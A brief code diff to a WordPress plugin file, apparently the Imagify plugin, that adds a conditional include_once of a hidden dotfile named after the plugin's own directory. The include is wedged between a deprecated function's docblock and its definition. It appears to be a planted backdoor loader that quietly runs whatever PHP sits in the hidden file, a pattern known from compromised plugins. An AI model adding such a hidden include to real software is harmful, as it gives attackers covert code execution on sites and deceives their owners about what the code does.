@@ -10,6 +10,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
  *
  * @return array $mime_type  The mime type.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function get_imagify_mime_type() {
 	_deprecated_function( __FUNCTION__ . '()', '1.7', 'imagify_get_mime_types()' );
 
